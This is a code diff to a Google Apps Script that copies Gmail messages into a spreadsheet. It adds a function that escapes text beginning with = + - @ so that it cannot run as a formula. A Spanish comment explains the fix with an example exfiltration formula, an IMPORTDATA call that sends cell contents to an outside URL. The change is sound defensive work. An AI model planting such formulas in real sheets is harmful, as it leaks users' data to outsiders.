@@ -93,8 +93,8 @@ function extraerMails() {
       filas.push([
         msg.getDate(), hilo.getId(), idMsg,
         delCliente ? 'Recibido (Cliente)' : 'Enviado (Nosotros)',
-        de, para, msg.getSubject(),
-        msg.getPlainBody().substring(0, CONFIG.LARGO_RESUMEN).replace(/\n/g, ' '),
+        seguro(de), seguro(para), seguro(msg.getSubject()),
+        seguro(msg.getPlainBody().substring(0, CONFIG.LARGO_RESUMEN).replace(/\n/g, ' ')),
         adjuntos.length > 0, tipos.join(', '),
         tieneImagen && !tienePdf   // el cliente mandó una captura en lugar del comprobante
       ]);
@@ -201,6 +201,17 @@ function direcciones(campo) {
 function esDelCliente(campo) {
   var dominio = CONFIG.DOMINIO_CLIENTE.toLowerCase();
   return direcciones(campo).some(function (d) { return d.slice(-dominio.length) === dominio; });
+}
+
+
+/**
+ * Texto que viene de un mail, listo para escribir en la hoja. Si empieza con = + - @,
+ * Sheets lo tomaría como fórmula (por ejemplo, =IMPORTDATA("https://...?"&A2) mandaría
+ * datos de la hoja afuera). El apóstrofo inicial lo deja como texto y no se ve en la celda.
+ */
+function seguro(t) {
+  t = String(t);
+  return /^[=+\-@]/.test(t) ? "'" + t : t;
 }
 
 
